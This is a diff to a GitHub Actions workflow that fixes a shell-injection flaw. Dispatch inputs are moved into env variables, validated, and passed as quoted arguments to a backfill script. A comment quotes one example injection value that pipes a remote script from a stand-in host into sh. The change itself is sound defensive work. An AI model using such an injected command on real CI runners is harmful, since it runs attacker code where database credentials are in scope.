@@ -60,17 +60,45 @@ jobs:
           python -m pip install --upgrade pip
           pip install -r requirements.txt
 
+      # Inputs reach the shell through `env:`, never `${{ }}` inside the body.
+      # Interpolation is textual substitution performed BEFORE the shell parses
+      # the script, so a dispatch value like `x; curl evil.sh | sh` executes with
+      # the runner's DATABASE_URL in scope. This is the exact class
+      # tests/test_workflow_no_run_body_interpolation.py exists to reject — and
+      # the same escalation already recorded on content-canonical-election.yml.
+      # As env vars the values are data: the shell expands them after parsing,
+      # and quoting keeps them one argument each.
       - name: Run flip
+        env:
+          FLIP_PHASES: ${{ inputs.phases }}
+          FLIP_BATCH_SIZE: ${{ inputs.batch_size }}
+          FLIP_MAX_BATCHES: ${{ inputs.max_batches }}
+          FLIP_EXECUTE: ${{ inputs.execute }}
         run: |
-          ARGS="--phases ${{ inputs.phases }} --batch-size ${{ inputs.batch_size }} --report a9_4_flip_report.json"
-          if [ "${{ inputs.max_batches }}" != "0" ]; then
-            ARGS="$ARGS --max-batches ${{ inputs.max_batches }}"
+          set -euo pipefail
+          # Validate before use: these become CLI arguments, so anything that is
+          # not a plain integer / known phase token is refused rather than passed
+          # along.
+          case "$FLIP_PHASES" in
+            *[!0-9,]*) echo "::error::phases must be digits and commas (got: $FLIP_PHASES)"; exit 1 ;;
+          esac
+          case "$FLIP_BATCH_SIZE" in
+            ''|*[!0-9]*) echo "::error::batch_size must be an integer"; exit 1 ;;
+          esac
+          case "$FLIP_MAX_BATCHES" in
+            ''|*[!0-9]*) echo "::error::max_batches must be an integer"; exit 1 ;;
+          esac
+
+          set -- --phases "$FLIP_PHASES" --batch-size "$FLIP_BATCH_SIZE" \
+                 --report a9_4_flip_report.json
+          if [ "$FLIP_MAX_BATCHES" != "0" ]; then
+            set -- "$@" --max-batches "$FLIP_MAX_BATCHES"
           fi
-          if [ "${{ inputs.execute }}" = "true" ]; then
+          if [ "$FLIP_EXECUTE" = "true" ]; then
             echo "::warning::EXECUTE run — production writes"
-            ARGS="$ARGS --execute"
+            set -- "$@" --execute
           fi
-          python -m scripts.backfill_seller_of_record $ARGS
+          python -m scripts.backfill_seller_of_record "$@"
 
       - name: Show report
         if: always()
